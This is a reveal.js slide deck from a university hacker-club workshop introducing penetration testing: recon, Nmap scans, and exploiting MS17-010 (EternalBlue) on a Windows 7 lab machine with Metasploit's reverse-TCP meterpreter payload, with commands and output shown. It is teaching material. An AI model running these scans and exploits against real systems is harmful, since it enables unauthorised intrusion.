<!doctype html>
<html>
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

		<title>HackerSir_0420</title>

		<link rel="stylesheet" href="dist/reset.css">
		<link rel="stylesheet" href="dist/reveal.css">
		<link rel="stylesheet" href="dist/theme/blood.css">

		<!-- Theme used for syntax highlighted code -->
		<link rel="stylesheet" href="plugin/highlight/monokai.css">

        <style>
        h1, h2, h3, h4, h5, h6 {
            text-transform: none !important;
        }
        </style>

	</head>
	<body>
		<div class="reveal">
			<div class="slides">

				<section data-background-video="./media/2.mp4"
                    data-background-video-loop data-background-video-muted data-background-opacity="0.4">
                    <div style="color: #F6F1F1; font-size: 2.5em; font-weight: 650;">
                        Penetration Test
                    </div>
                    <div style="color: #F6F1F1;">
                        AuTong | HackerSir | April 20, 2023
                    </div>
                </section>
                
                <section>
                    <section>
                        <h3><a href="https://forms.gle/c132ZQSQ2QJMUzav9" target="_blank"> 前測表單</a></h3>
                        <img src="./media/3.png" width="40%" height="40%" alt="https://forms.gle/c132ZQSQ2QJMUzav9">
                    </section>
                    
                    <section data-auto-animate>
                        <h3>免責聲明</h3>
                        <h5 class="fragment">
                        本次內容僅用於學術用途，若學員以之進行非法活動，本人及逢甲大學黑客社概不負責
                        </h5>
                    </section>


                    <section>
                        <h3>資安法規</h3>
                        <pre><code class="mybackground">
中華民國刑法

第 358 條 = 無故輸入他人帳號密碼、破解使用電腦之保護措施或利用電腦系統之漏洞
            ，而入侵他人之電腦或其相關設備者

第 359 條 = 無故取得、刪除或變更他人電腦或其相關設備之電磁紀錄，致生損害於公
            眾或他人者

第 360 條 = 無故以電腦程式或其他電磁方式干擾他人電腦或其相關設備，致生損害於
            公眾或他人者

第 362 條 = 製作專供犯本章之罪之電腦程式，而供自己或他人犯本章之罪，致生損害
            於公眾或他人者
                        </code></pre>
                    </section>
                </section>


                <section>
                    <section>
                        <div style="font-size: 2em; font-weight: 600;">滲透測試</div>
                        <h4>Penetration Test (PenTest)</h4>
                    </section>
                    <section>
                        <div style="font-size: 1.3em; font-weight: 600;"> 以黑帽駭客的思維與手法</div>
                        <div style="font-size: 1.3em; font-weight: 600;"> 為企業檢測資訊系統安全 </div>
                        <p><ul>
                            <li class="fragment"><p><h4> 設備安全 </h4></p></li>
                            <li class="fragment"><p><h4> 網頁安全 </h4></p></li>
                            <li class="fragment"><p><h4> 網路安全 </h4></p></li>
                        </ul></p>
                    </section>
                    <section data-auto-animate>
                        <div data-id="web" style="font-size: 1.4em; font-weight: 600;">網路安全</div>
                        <div class="fragment"><p>
                            <h5>整個網路系統，包含 www 服務以及以外的服務，</h5>
                            <h5>例如 ftp、ssh、snmp 等等</h5>
                            </p></p></div>
                    </section>
                    <section data-auto-animate>
                        <div data-id="web" style="font-size: 1.4em; font-weight: 600;">網路安全檢測</div>
                        <div>
                            <p><ul>
                                <li class="fragment"><p><h4> VPN </h4></p></li>
                                <li class="fragment"><p><h4> 企業內部 </h4></p></li>
                            </ul></p>
                        <div>
                    </section>
                    <section data-auto-animate>
                        <div data-id="sop" style="font-size: 1.4em; font-weight: 600;">檢測流程</div>
                        <p><h5>沒有一定的標準流程，但有框架可參考</h5></p>
                        <p><ul>
                            <p><h4><a href="https://attack.mitre.org/" target="_blank"> ATT&CK </a></h4></p>
                            <p><h4><a href="https://www.isecom.org/OSSTMM.3.pdf" target="_blank"> OSSTMM </a></h4></p>
                        </ul></p>
                    </section>
                    <section data-auto-animate>
                        <div data-id="sop" style="font-size: 1.4em; font-weight: 600;">檢測流程</div>
                        <div class="fragment"><p><ul>
                            <li><p><h4> 確認標的 </h4></p></li>
                            <li><p><h4> 偵查 </h4></p></li>
                            <li><p><h4> 弱點利用 </h4></p></li>
                            <li><p><h4> 檢測報告 </h4></p></li>
                            </ul></p><div>
                    </section>
                    <section data-auto-animate>
                        <div data-id="sop" style="font-size: 1.4em; font-weight: 600;">檢測流程</div>
                        <p><ul>
                            <li style="color: #515050;"><p><h4 style="color: #515050;"> 確認標的 </h4></p></li>
                            <li style="color: #FFFEF9;"><p><h4 style="color: #FFFEF9;"> 偵查 </h4></p></li>
                            <li style="color: #FFFEF9;"><p><h4 style="color: #FFFEF9;"> 弱點利用 </h4></p></li>
                            <li style="color: #515050;"><p><h4 style="color: #515050;"> 檢測報告 </h4></p></li>
                        </ul></p>
                    </section>
                </section>

                <section>
                    <section data-auto-animate>
                        <div data-id="target" style="font-size: 72px; font-weight: 600;">確認標的</div>
                    </section>
                    <section data-auto-animate>
                        <div data-id="target" style="font-size: 56px; font-weight: 600;">確認標的</div>
                        <p><ul>
                            <li class="fragment"><p><h4> 簽訂合約 </h4></p></li>
                            <div class="fragment">
                                <li><p><h4> 確認攻擊手法 </h4></p></li>
                                <li><p><h4> 確認使用工具 </h4></p></li>
                                <li><p><h4> 確認目標 IP、網址</h4></p></li>
                            </div>
                        </ul></p>
                    </section>
                    <section>
                        <ul>
                        <h5>靶機：與攻擊機同網段的 Windows</h5>
                        <h5>攻擊機：kali</h5>
                        </ul>
                    </section>
                    <section>
                        <h3>kali</h3>
                        <p><ul>
                            <li class="fragment"><p><h4> Linux 系統 </h4></p></li>
                            <li class="fragment"><p><h4> 600 多種資安工具 </h4></p></li>
                            <li class="fragment"><p><h4><a href="https://www.kali.org/tools/" target="_blank">參考資料</a></h4></p></li>
                        </ul></p>
                    </section>
                    <section>
                        <h4>確認攻擊機網段</h4>
                        <p><pre style="font-size: 20px"><code data-line-numbers="1-2|2|3-11|4">┌──(kali㉿kali)-[~]
└─$ ifconfig                        
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
    inet 192.168.92.135  netmask 255.255.255.0  broadcast 192.168.92.255
    inet6 fe80::8d61:46a8:8de:b2e9  prefixlen 64  scopeid 0x20<link>
    ether 00:0c:29:2c:4a:1c  txqueuelen 1000  (Ethernet)
    RX packets 711  bytes 65806 (64.2 KiB)
    RX errors 0  dropped 0  overruns 0  frame 0
    TX packets 149  bytes 25128 (24.5 KiB)
    TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
                        </code></pre></p>
                    </section>
                    <section data-auto-animate>
                            <h6>192.168.92.135</h6>
                            <h6>11000000.10101000.01011100.10000111</h6>
                            <h6>11111111.11111111.11111111.00000000</h6>
                    </section>
                    <section data-auto-animate>
                            <h6 style="color: #515050">11000000.10101000.01011100.10000111</h6>
                            <h6 style="color: #515050">11111111.11111111.11111111.00000000</h6>
                            <hr>
                            <h6>11000000.10101000.01011100.00000000</h6>
                    </section>
                    <section data-auto-animate>
                            <h6 style="color: #515050">11000000.10101000.01011100.10000111</h6>
                            <h6 style="color: #515050">11111111.11111111.11111111.00000000</h6>
                            <hr>
                            <h6>11000000.10101000.01011100.00000000</h6>
                            <h4>得知靶機為：192.168.92.XX</h4>
                    </section>
                    <section data-auto-animate>
                            <h6 style="color: #515050">11000000.10101000.01011100.10000111</h6>
                            <h6>11111111.11111111.11111111.00000000</h6>
                            <hr>
                            <h6 style="color: #515050">11000000.10101000.01011100.00000000</h6>
                            <h4>得知靶機為：<span style="color: #515050">192.168.92.XX</span></h4>
                            <h4>= 192.168.92.0/24</h4>
                    </section>
                    <section data-auto-animate>
                            <h6 style="color: #515050">11000000.10101000.01011100.10000111</h6>
                            <h6><span style="color: #a23">11111111.11111111.11111111</span>.00000000</h6>
                            <hr>
                            <h6 style="color: #515050">11000000.10101000.01011100.00000000</h6>
                            <h4>得知靶機為：<span style="color: #515050">192.168.92.XX</span></h4>
                            <h4>= 192.168.92.0/<span style="color: #a23">24</span></h4>
                    </section>
                </section>

                <section>
                    <section data-auto-animate>
                        <div data-id="target" style="font-size: 72px; font-weight: 600;">偵查</div>
                    </section>
                    <section data-auto-animate>
                        <div data-id="target" style="font-size: 72px; font-weight: 600;">偵查</div>
                        <p><ul>
                            <div class="fragment">
                                <li><p><h4> 被動偵查 </h4></p></li>
                                <li><p><h4> 主動偵查 </h4></p></li>
                            </div>
                        </ul></p>
                    </section>
                    <section data-auto-animate>
                        <div data-id="pass" style="font-size: 56px; font-weight: 600;">被動偵查</div>
                            <p><h4 class="fragment"> 不主動向目標發送封包(不接觸)，以收集公開情報為原則，例如</h4></p>
                            <div class="fragment">
                                <p><ul>
                                <li><p><h4><a href="https://myip.ms/info/whois/185.199.108.153/k/3015304041/website/autooong.github.io" target="_blank"> IP、域名、主機名 </a></h4></p></li>
                                <li><p><h4><a href="https://www.nslookup.io/domains/autooong.github.io/dns-records/" target="_blank"> DNS </a></h4></p></li>
                                <li><p><h4><a href="https://zeroday.hitcon.org/vulnerability/disclosed" target="_blank"> 曾被通報的洞 </a></h4></p></li>
                                <li><p><h4><a href="https://web.archive.org/web/20051125145453/http://www.fcu.edu.tw/main/faculty/faculty_index.htm" target="_blank"> 網頁的歷史紀錄 </a></h4></p></li>
                                <li><p><h4><a href="https://www.shodan.io/dashboard" target="_blank"> Shodan </a></h4></p></li>
                                <li><p><h4><a href="https://www.exploit-db.com/google-hacking-database" target="_blank"> Google Hacking </a></h4></p></li>
                                </ul></p>
                            </div>
                    </section>
                    <section>
                        <div style="font-size: 56px; font-weight: 600;">主動偵查</div>
                        <p><h4> 會主動接觸目標，通常以掃描的方式 </h4></p>
                        <p><ul>
                            <div class="fragment">
                                <li><p><h4><a href="https://www.kali.org/tools/zaproxy/" target="_blank"> OWASP ZAP </a></h4></p></li>
                                <li><p><h4><a href="https://www.tenable.com/blog/getting-started-with-nessus-on-kali-linux" target="_blank"> Nessus </a></h4></p></li>
                            </div>
                            <li class="fragment"><p><h4><a href="https://nmap.org/book/intro.html" target="_blank"> Nmap </a></h4></p></li>
                        </ul></p>
                    </section>
                    <section>
                        <div data-id="target2" style="font-size: 56px; font-weight: 600;">Nmap</div>
                        <p><h5 class="fragment">port scanner，由回傳的 banner 判定 port 狀態</h5></p>
                    </section>
                    <section data-auto-animate>
                        <h4 data-id="nmapoption">nmap [Options] {target}</h4>    
                    </section>
                    <section data-auto-animate>
                        <h4 data-id="nmapoption">nmap <span style="color: #a23">[Options]</span> {target}</h4>    
                        <p><ul>
                            <li class="fragment"><p><h4> nmap 192.168.92.129 </h4></p></li>
                            <li class="fragment"><p><h4> nmap <span style="color: #a23">-Pn</span> 192.168.92.129 </h4></p></li>
                        </ul></p>
                    </section>
                    <section data-auto-animate>
                        <h4 data-id="nmapoption">nmap [Options] <span style="color: #a23">{target}</span></h4>    
                        <p><ul>
                            <li><p><h4> nmap <span style="color: #a23">192.168.92.129</span> </h4></p></li>
                            <li><p><h4> nmap -Pn <span style="color: #a23">192.168.92.129</span> </h4></p></li>
                        </ul></p>
                    </section>
                    <section>
                        <div style="font-size: 56px; font-weight: 600;">Options</div>
                        <p>
                        <table>
                            <thead>
                                <tr>
                                    <th>參數</th>
                                    <th>說明</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td>-P</td>
                                    <td>用於 ping</td>
                                </tr>
                                <tr>
                                    <td>-s</td>
                                    <td>用於 scan</td>
                                </tr>
                                <tr>
                                    <td>-p</td>
                                    <td>用於 port</td>
                                </tr>
                            </tbody>
                        </table>
                        </p>
                    </section>
                    <section>
                        <div style="font-size: 56px; font-weight: 600;">Options: -Pn</div>
                        <p><ul>
                            <li class="fragment"><p><h4> P：發送 ICMP 封包</h4></p></li>
                            <li class="fragment"><p><h4> Windows 會擋</h4></p></li>
                        </ul></p>
                    </section>
                    <section>
                        <div style="font-size: 56px; font-weight: 600;">Options: -sS</div>
                    </section>
                    <section>
                        <div style="font-size: 56px; font-weight: 600;">TCP 三向交握</div>
                        <ul>
                            <h3 class="fragment" style="white-space: pre;"><span style="position: relative; left: -13px;"><span style="color: #a23">A</span>                               <span style="color: #2B6DF0">B</span></span></h3>
                        <br>
                        <h4 class="fragment" style="white-space: pre;"><span style="color: #a23"> <span style="position: relative; top: -17px;">________</span>SYN<span style="position: relative; top: -17px;">________</span><span style="position: relative; left: -19px;">></span></span></h4>
                        <br>
                        <h4 class="fragment" style="white-space: pre;"><span style="color: #2B6DF0">          <span style="position: relative; right: -19px;"><</span><span style="position: relative; top: -17px;">______</span>ACK,SYN<span style="position: relative; top: -17px;">______</span></span></h4>
                        <br>
                        <h4 class="fragment" style="white-space: pre;"><span style="color: #a23"> <span style="position: relative; top: -17px;">________</span>ACK<span style="position: relative; top: -17px;">________</span><span style="position: relative; left: -19px;">></span></span></h4>
                        <br>
                        </ul> 
                    </section>
                    <section>
                        <div style="font-size: 56px; font-weight: 600;">Options: -sS</div>
                        <p><ul>
                            <li class="fragment"><p><h4> 只發送第一步 SYN 封包</h4></p></li>
                            <li class="fragment"><p><h4> 隱匿性較高</h4></p></li>
                            <li class="fragment"><p><h4> 需要用 sudo </h4></p></li>
                        </ul></p>
                    </section>
                    <section>
                        <div style="font-size: 56px; font-weight: 600;">Options: -p</div>
                        <p><ul>
                            <li class="fragment"><p><h4> -p21 </h4></p></li>
                            <li class="fragment"><p><h4> -p21,443 </h4></p></li>
                            <li class="fragment"><p><h4> -p20-80 </h4></p></li>
                        </ul></p>
                    </section>
                    <section>
                        <div style="font-size: 56px; font-weight: 600;">target: IP</div>
                        <p><ul>
                            <li class="fragment"><p><h4> 192.168.92.129 </h4></p></li>
                            <li class="fragment"><p><h4> 192.168.92.129-135 </h4></p></li>
                            <li class="fragment"><p><h4> 192.168.92.135/24 </h4></p></li>
                        </ul></p>
                    </section>
                    <section data-auto-animate>
                        <pre data-id="nmap1"><code data-line-numbers="1-6|1,5">Nmap scan report for 192.168.92.XX
Host is up (0.016s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:85:79:94 (VMware)</code></pre>
                    </section>
                    <section data-auto-animate>
                        <p><h4>sudo nmap -Pn -sS 192.168.92.135/24</h4></p>
                        <pre data-id="nmap1"><code data-line-numbers="1,2,4,8">┌──(kali㉿kali)-[~]
└─$ sudo nmap -Pn -sS 192.168.92.130/24 
...
Nmap scan report for 192.168.92.129
Host is up (0.016s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:85:79:94 (VMware)
...</code></pre>
                    </section>
                    <section data-auto-animate>
                        <p><h3>確認 IP 後 ... 再詳細一點</h3></p>
                    </section>
                    <section>
                        <div style="font-size: 56px; font-weight: 600;">掃描全部的 port</div>
                        <p><ul>
                            <li class="fragment"><p><h4> -p1-65535 </h4></p></li>
                            <li class="fragment"><p><h4> -p-</h4></p></li>
                        </ul></p>
                    </section>
                    <section>
                        <div style="font-size: 56px; font-weight: 600;">NSE</div>
                        <p><ul>
                            <li class="fragment"><p><h4> nmap 的 script</h4></p></li>
                            <li class="fragment"><p><h4> 位置通常在：nmap/scripts</h4></p></li>
                            <li class="fragment"><p><h4> 依功能分成 14 種類別</h4></p></li>
                            <li class="fragment"><p><h4> 不是每種都常用，如 DoS</h4></p></li>
                            <li class="fragment"><p><h4><a href="https://www.infosecmatter.com/nmap-nse-library/" target="_blank"> 參考資料</a></h4></p></li>
                        </ul></p>
                    </section>
                    <section>
                        <table>
                            <thead>
                                <tr>
                                    <th>類別</th>
                                    <th>說明</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td>default</td>
                                    <td>基本的訊息收集、漏洞掃描</td>
                                </tr>
                                <tr>
                                    <td>discovery</td>
                                    <td>從公開資訊獲取資訊，如網頁根目錄</td>
                                </tr>
                                <tr>
                                    <td>vuln</td>
                                    <td>驗證是否存在漏洞</td>
                                </tr>
                                <tr>
                                    <td>exploit</td>
                                    <td>利用漏洞，最好使用同時帶有 safe 的</td>
                                </tr>
                                <tr>
                                    <td>safe</td>
                                    <td>不會破壞目標、不消耗大量資源</td>
                                </tr>
                                <tr>
                                    <td>malware</td>
                                    <td>檢測目標是否感染已知惡意程式</td>
                                </tr>
                                <tr>
                                    <td>version</td>
                                    <td>版本檢測</td>
                                </tr>
                            </tbody>
                        </table>
                    </section>
                    <section>
                        <div style="font-size: 56px; font-weight: 600;">NSE 用法</div>
                        <p><ul>
                            <li class="fragment"><p><h4> 加上參數 --script <名稱>|<種類></h4></p></li>
                            <pre class="fragment"><code>nmap --script safe 192.168.92.139</code></pre>
                            <li class="fragment"><p><h4> 如果 script 需要參數，--script-args</h4></p></li>
                            <pre class="fragment"><code>nmap --script default --script-args "timeout=250"</code></pre>
                            <pre style="font-size: 18px" class="fragment"><code>nmap --script default --script-args "broadcast-ping.timeout=250"</code></pre>
                            <li class="fragment"><p><h4> --script default 等同於 -sC</h4></p></li>
                            <li class="fragment"><p><h4> 若同時 default、version 則 -sCV</h4></p></li>
                        </ul></p>
                    </section>
                    <section>
                        <h4>sudo nmap -Pn -p- -sSCV YOUR.IP</h4>
                        <pre style="font-size: 20px" class="fragment"><code>$ sudo nmap -Pn -p- -sSCV 192.168.92.139 
Host script results:
| smb2-time: 
|_  :
| smb2-security-mode: 
|_  :
| smb-security-mode: 
|_  :
| smb-os-discovery: 
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: WIN-TT6NI6NJQ6V
|   NetBIOS computer name: WIN-TT6NI6NJQ6V\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-04-20T06:57:19+08:00
|_clock-skew: mean: -2h39m58s, deviation: 4h37m05s, median: 0s
</code></pre>
                        </ul></p>
                    </section>
                    <section>
                        <div style="font-size: 56px; font-weight: 600;">smb：port445</div>
                        <p><ul>
                            <li class="fragment"><p><h4>Windows 系統的標準協議</h4></p></li>
                            <li class="fragment"><p><h4>用於文件、印表機共享</h4></p></li>
                            <li class="fragment"><p><h4>其他作業系統可做為客戶端運行</h4></p></li>
                            <li class="fragment"><p><h4>samba 實現 Windows 與 Linux 共享</h4></p></li>
                        </ul></p>
                    </section>
                    <section>
                        <div style="font-size: 56px; font-weight: 600;">vuln：驗證是否存在漏洞</div>
                        <div class="fragment"><p><h4>nmap -Pn --script vuln YOUR.IP</h4></p></div>
                        <pre style="font-size: 18px" class="fragment"><code data-line-numbers="3-10">$ nmap -Pn --script vuln 192.168.92.139 
Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|_       servers (ms17-010).
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
</code></pre>
                    </section>
                </section>
                    
                <section>
                    <section>
                        <div data-id="target" style="font-size: 72px; font-weight: 600;">弱點利用</div>
                    </section>
                    <section>
                        <div style="font-size: 56px; font-weight: 600;">ms17-010</div>
                        <p><ul>
                            <li class="fragment"><p><h4>永恆之藍(EternalBlue)</h4></p></li>
                            <li class="fragment"><p><h4>三個 SMB 程式漏洞組成</h4></p></li>
                        </ul></p>
                    </section>
                    <section>
                        <div style="font-size: 56px; font-weight: 600;">Bug 1 & 2</div>
                        <p><ul>
                            <li class="fragment"><p><h4>SMB：共享文件</h4></p></li>
                            <li class="fragment"><p><h4>file extended attributes(FEA)</h4></p></li>
                            <li class="fragment"><p><h4>轉為 NTFEA 發生緩衝區溢出</h4></p></li>
                            <li class="fragment"><p><h4>可操作記憶體到想要的位址</h4></p></li>
                        </ul></p>
                    </section>
                    <section>
                        <div style="font-size: 56px; font-weight: 600;">Bug 3</div>
                        <p><ul>
                            <li class="fragment"><p><h4>使用者驗證機制</h4></p></li>
                            <li class="fragment"><p><h4>可隨意寫入資料到記憶體</h4></p></li>
                        </ul></p>
                    </section>
                    <section>
                        <p><ul>
                            <li class="fragment"><p><h4>Bug 1 & 2 + Bug 3 = 永恆之藍</h4></p></li>
                            <li class="fragment"><p><h4>Remote Code Execution (RCE)</h4></p></li>
                        </ul></p>
                        <br>
                        <div class="fragment" style="font-size: 56px; font-weight: 600;">如何利用？</div>
                    </section>
                    <section>
                        <div style="font-size: 56px; font-weight: 600;">Payload</div>
                        <p><ul>
                            <li class="fragment"><p><h4>可執行想要目的的惡意程式</h4></p></li>
                            <li class="fragment"><p><h4>利用此拿到靶機的控制權</h4></p></li>
                            <li class="fragment"><p><h4>開啟雙方 port 讓靶機和攻擊機連線</h4></p></li>
                            <li class="fragment"><p><h4>靶機把 shell 的控制權交給攻擊機</h4></p></li>
                            <li class="fragment"><p><h4>reverse shell</h4></p></li>
                        </ul></p>
                    </section>
                    <section>
                        <div style="font-size: 56px; font-weight: 600;">Metasploit</div>
                        <p><ul>
                            <li class="fragment"><p><h4>漏洞測試與攻擊框架</h4></p></li>
                            <li class="fragment"><p><h4>攻擊工具開發(Ruby)、漏洞檢測與利用</h4></p></li>
                            <li class="fragment"><p><h4><a href="https://docs.metasploit.com/docs/using-metasploit/basics/" target="_blank">參考資料</a></h4></p></li>

                        </ul></p>
                    </section>
                    <section>
                        <div style="font-size: 56px; font-weight: 600;">Metasploit 用法</div>
                        <p><ol>
                            <li class="fragment"><p><h4>搜尋漏洞利用工具</h4></p></li>
                            <li class="fragment"><p><h4>選擇工具</h4></p></li>
                            <li class="fragment"><p><h4>確認參數</h4></p></li>
                            <li class="fragment"><p><h4>輸入參數</h4></p></li>
                            <li class="fragment"><p><h4>執行</h4></p></li>
                        </ol></p>
                    </section>
                    <section>
                        <div style="font-size: 56px; font-weight: 600;">0. 執行：msfconsole</div>
                        <pre style="font-size: 14px" class="fragment"><code>                                       Trace program: running

                                           wake up, Neo...                                                   
                                        the matrix has you                                                   
                                      follow the white rabbit.

                                          knock, knock, Neo.

                                                        (`.         ,-,
                                                        ` `.    ,;' /
                                                         `.  ,'/ .'
                                                          `. X /.'
                                                .-;--''--.._` ` (
                                              .'            /   `
                                             ,           ` '   Q '
                                             ,         ,   `._    \
                                          ,.|         '     `-.;_'
                                          :  . `  ;    `  ` --,.._;
                                           ' `    ,   )   .'
                                              `._ ,  '   /_
                                                 ; ,''-,;' ``-
                                                  ``-..__``--`</code></pre>
                    </section>
                    <section>
                        <div style="font-size: 56px; font-weight: 600;">1. 搜尋漏洞利用工具</div>
                        <div class="fragment"><p><h4>search ms17-010</h4></p></div>
                        <pre class="fragment"><code data-line-numbers="1-11|5,7,8,11">msf6 > search ms17-010
                        
Matching Modules
================
   #  Name                                        Rank     Check
   -  ----                                        ----     -----
   0  exploit/windows/smb/ms17_010_eternalblue    average   Yes   
   1  exploit/windows/smb/ms17_010_psexec         normal    Yes
   2  auxiliary/admin/smb/ms17_010_command        normal    No    
   3  auxiliary/scanner/smb/smb_ms17_010          normal    No     
   4  exploit/windows/smb/smb_doublepulsar_rce    great     Yes

</code></pre>
                    </section>
                    <section>
                        <div style="font-size: 56px; font-weight: 600;">Rank</div>
                        <table>
                            <thead>
                                <tr>
                                    <th>名稱</th>
                                    <th>說明</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td>Excellent</td>
                                    <td>保證不會把靶機打爛</td>
                                </tr>
                                <tr>
                                    <td>Great</td>
                                    <td>依照軟體版本調整目標，成功率較高</td>
                                </tr>
                                <tr>
                                    <td>Good</td>
                                    <td>依照軟體種類調整目標</td>
                                </tr>
                                <tr>
                                    <td>Normal</td>
                                    <td>成功率穩定</td>
                                </tr>
                                <tr>
                                    <td>Average</td>
                                    <td>成功率不穩定(50% 以上)</td>
                                </tr>
                                <tr>
                                    <td>Low</td>
                                    <td>成功率不穩定(50% 以下)</td>
                                </tr>
                            </tbody>
                        </table>
                    </section>
                    <section data-auto-animate>
                        <div data-id="msftool" style="font-size: 56px; font-weight: 600;">2. 選擇工具</div>
                        <div class="fragment"><p><h4>use 1</h4></p></div>
                        <pre class="fragment"><code style="font-size: 14px" data-line-numbers="1-12|1|6|11-12|">msf6 exploit(windows/smb/ms17_010_psexec) > check

[*] 192.168.92.139:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.92.139:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7601 Service Pack 1
[*] 192.168.92.139:445 - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.92.139:445 - The target is vulnerable.
msf6 exploit(windows/smb/ms17_010_psexec) > run

[*] Started reverse TCP handler on 192.168.92.135:4444 
[*] 192.168.92.139:445 - Target OS: Windows 7 Home Basic 7601 Service Pack 1
[-] 192.168.92.139:445 - Unable to find accessible named pipe!
[*] Exploit completed, but no session was created.
</code></pre>
                    </section>
                    <section data-auto-animate>
                        <div data-id="msftool" style="font-size: 56px; font-weight: 600;">2. 選擇工具</div>
                        <div class="fragment"><p><h4>use 4</h4></p></div>
                        <pre class="fragment"><code style="font-size: 20px" data-line-numbers="1-5|1,5">msf6 exploit(windows/smb/smb_doublepulsar_rce) > check

[*] 192.168.92.139:445 - Sending ping to DOUBLEPULSAR
[-] 192.168.92.139:445 - DOUBLEPULSAR not detected or disabled
[*] 192.168.92.139:445 - The target is not exploitable.
</code></pre>
                        <br>
                        <div class="fragment" style="font-size: 56px; font-weight: 600;">因此選擇編號 0：use 0</div>
                    </section>
                    <section>
                        <div style="font-size: 56px; font-weight: 600;">3. 確認參數</div>
                        <div class="fragment"><p><h4>show options</h4></p></div>
                        <pre class="fragment"><code style="font-size: 22px" data-line-numbers="1|3-13|16-22|7">msf6 exploit(windows/smb/ms17_010_eternalblue) > show options 

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required 
   ----           ---------------  --------
   RHOSTS                          yes       
   RPORT          445              yes      
   SMBDomain                       no        
   SMBPass                         no       
   SMBUser                         no       
   VERIFY_ARCH    true             yes       
   VERIFY_TARGET  true             yes       


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  
   ----      ---------------  --------
   EXITFUNC  thread           yes       
   LHOST     192.168.92.135   yes       
   LPORT     4444             yes 




</code></pre>
                    </section>
                    <section>
                        <div style="font-size: 56px; font-weight: 600;">4. 輸入參數</div>
                        <div class="fragment"><p><h4>set</h4></p></div>
                        <pre class="fragment"><code style="font-size: 20px" data-line-numbers="">msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.92.139
RHOSTS => 192.168.92.139
</code></pre>
                    </section>
                    <section>
                        <div style="font-size: 56px; font-weight: 600;">5. 執行</div>
                        <div class="fragment"><p><h4>check</h4></p></div>
                        <pre class="fragment"><code style="font-size: 14px" data-line-numbers="1-6|6">msf6 exploit(windows/smb/ms17_010_eternalblue) > check

[*] 192.168.92.139:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.92.139:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7601 Service Pack 1
[*] 192.168.92.139:445 - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.92.139:445 - The target is vulnerable.
</code></pre>
                        <div class="fragment"><p><h4>run</h4></p></div>
                        <pre class="fragment"><code style="font-size: 20px" data-line-numbers="">msf6 exploit(windows/smb/ms17_010_eternalblue) > run
:
meterpreter > pwd
C:\Windows\system32
</code></pre>
                    </section>
                    <section>
                        <div style="font-size: 56px; font-weight: 600;">取得 RCE 之後...?</div>
                        <p><ul>
                            <li class="fragment"><p><h4>後滲透</h4></p></li>
                            <div class="fragment">
                            <li><p><h4>提權</h4></p></li>
                            <li><p><h4>橫向移動</h4></p></li>
                            </div>
                        </ul></p>
                    </section>
                </section>

                <section>
                    <section data-auto-animate>
                        <div data-id="target" style="font-size: 72px; font-weight: 600;">檢測報告</div>
                    </section>
                    <section data-auto-animate>
                        <div data-id="target" style="font-size: 56px; font-weight: 600;">檢測報告</div>
                        <p><ul>
                            <li class="fragment"><p><h4> 依公司會有不同的模板 </h4></p></li>
                            <div class="fragment">
                                <li><p><h4> 給資安人員看的：整體漏洞情況 & 分布 </h4></p></li>
                                <li><p><h4> 給工程師看的：漏洞細節 & 修復建議 </h4></p></li>
                                <li><p><h4> 給主管級別看的：整體漏洞總結</h4></p></li>
                            </div>
                        </ul></p>
                    </section>
                    <section>
                        <div style="font-size: 56px; font-weight: 600;">memo</div>
                        <p><ul>
                            <li class="fragment"><p><h4> 檢測者不一定負責報告撰寫 </h4></p></li>
                            <li class="fragment"><p><h4> 每一步都要截圖 </h4></p></li>
                            <li class="fragment"><p><h4> 過程要詳細 </h4></p></li>
                            <div class="fragment">
                                <li><p><h4> 截圖工具：<a href="https://picpick.app/zh-tw/" target="_blank">PicPick</a></h4></p></li>
                                <li><p><h4> 筆記工具：Microsoft OneNote</h4></p></li>
                            </div>
                        </ul></p>
                    </section>
                </section>
                <section>
                    <section>
                        <h3><a href="https://forms.gle/5ZHkrrsKtHkPuMfX7" target="_blank"> 回饋表單</a></h3>
                        <img src="./media/4.png" width="40%" height="40%" alt="https://forms.gle/5ZHkrrsKtHkPuMfX7">
                    </section>
                </section>

			</div>
		</div>

		<script src="dist/reveal.js"></script>
		<script src="plugin/notes/notes.js"></script>
		<script src="plugin/markdown/markdown.js"></script>
		<script src="plugin/highlight/highlight.js"></script>
		<script>
			// More info about initialization & config:
			// - https://revealjs.com/initialization/
			// - https://revealjs.com/config/
			Reveal.initialize({
				hash: true,
                slideNumber: true,

				// Learn about plugins: https://revealjs.com/plugins/
				plugins: [ RevealMarkdown, RevealHighlight, RevealNotes ]
			});
		</script>
	</body>
</html>
